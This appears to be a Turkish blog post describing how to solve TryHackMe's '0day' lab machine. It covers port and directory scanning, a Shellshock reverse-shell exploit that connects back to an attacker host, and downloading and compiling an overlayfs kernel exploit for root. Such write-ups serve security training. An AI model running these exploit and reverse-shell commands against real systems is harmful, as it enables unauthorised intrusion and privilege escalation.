---
title: "0day Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere [TryHackMe](https://tryhackme.com/) platformunda bulunan "0day" isimli makinenin çözümü anlatacağım. Keyifli Okumalar...

1 - *Nmap* aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```shell
nmap -sS -sV -O 10.10.96.225
```

2 - Tarama sonucunda 22 ve 80 numaralı portların açık olduğunu görüyorum.

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3 -  *gobuster* aracını kullanarak 80 numaralı port üzerinde dizin taraması yapıyorum.

```shell
> gobuster dir -u http://10.10.96.225/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50       
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.225/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/04 17:28:19 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 309] [--> http://10.10.96.225/img/]
/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.96.225/cgi-bin/]
/uploads              (Status: 301) [Size: 313] [--> http://10.10.96.225/uploads/]
/admin                (Status: 301) [Size: 311] [--> http://10.10.96.225/admin/]
/css                  (Status: 301) [Size: 309] [--> http://10.10.96.225/css/]
/js                   (Status: 301) [Size: 308] [--> http://10.10.96.225/js/]
/backup               (Status: 301) [Size: 312] [--> http://10.10.96.225/backup/]
/secret               (Status: 301) [Size: 312] [--> http://10.10.96.225/secret/]
```

4 - **backup** dizini içerisinde bir RSA anahtarı buluyorum. Geri kalan dizinlerden herhangi bir saldırı vektörü bulamadığım için *nikto* aracı ile web sitesini tarıyorum. *Nikto* taramasından sonra web sitesinde [CVE-2014-6278](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278) zaafiyetinin olduğunu görüyorum.

```shell
> nikto -h 10.10.180.23

*
*
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
*
*

```

5 - Daha sonra [exploit-db](https://www.exploit-db.com/) adresinden [ilgili](https://www.exploit-db.com/exploits/34900) zaafiyetin ID'sini öğreniyorum. *searchsploit* aracı ile zafiyet kodunu indiriyorum.

```shell
> searcsploit -m 34900
```

6 - Gerekli parametreleri girip python kodunu çalıştırıyorum.

```shell
> python2.7 34900.py payload=reverse rhost=10.10.96.225 lhost=XX.XX.XX.XX lport=4444                                
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[*] 404 on : /cgi-sys/entropysearch.cgi
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[!] Successfully exploited
[!] Incoming connection from 10.10.96.225
10.10.96.225> ls
test.cgi
```

7 - Home dizinine girip *user.txt* dosyasını okuyarak ilk bayrağımızı elde ediyoruz.

```shell
10.10.96.225> cd /home
10.10.96.225> ls
ryan

10.10.96.225> cd ryan
10.10.96.225> ls
user.txt

10.10.96.225> cat user.txt
THM{CENSORED}
```

8 - *uname -a* komutu ile sistem hakkında bilgi topluyorum.

```shell
10.10.96.225> uname -a   
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

9 - *searchsploit* aracı ile "Linux Kernel 3.13.0" sistem bilgisini aratıyorum. Daha sonra **37292** id'li zaafiyeti indiriyorum.

```system
searchsploit "Linux Kernel 3.13.0"
*
*
*
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37292.c
*
*
*
searchsploit -m 37292
```

10 - Pythondaki "http.server" modülünü kullanarak 37292.c dosyasını zaafiyetli makineye aktarıyorum. *gcc* ile C dosyasını derliyorum.

```shell
# Saldırgan Makinesi
> python -m http.server

# Hedef Makine
cd /tmp
wget http://XX.XX.XX.XX:8000/37292.c
gcc 37292.c -o root
```

11 - Derledikten sonra bir hata alıyorum. Bu hatayı çözmek için aşağıdaki kodu girip tekrar derliyorum.

```shell
# Alınan Hata

# Hatayı gidermek için
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
gcc 37292.c -o root && ./root
```

12 - *whoami* komutunu çalıştırdığımda **root** kullanıcısına geçtiğimi görüyorum. *root* dizinindeki root.txt dosyasını okuyarak ikinci ve son bayrağımızı elde ediyoruz.

```shell
10.10.96.225> whoami
# 
10.10.96.225> 
root
# 
10.10.96.225> 
# 
10.10.96.225> cat /root/root.txt
# 
10.10.96.225> 
THM{CENSORED}
```